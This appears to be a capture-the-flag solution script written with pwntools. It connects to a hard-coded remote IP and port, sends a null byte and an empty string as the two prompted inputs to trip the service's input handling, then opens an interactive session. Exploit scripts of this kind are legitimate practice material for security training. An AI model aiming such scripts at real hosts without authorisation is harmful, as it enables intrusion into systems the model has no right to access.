from pwn import *

HOST = "89.38.210.129"
PORT = 6665

r = remote(HOST, PORT)

input1 = b'\x00'
input2 = ''

r.recvuntil("First input:")
r.sendline(input1)

r.recvuntil("Second input:")
r.sendline(input2)

r.interactive()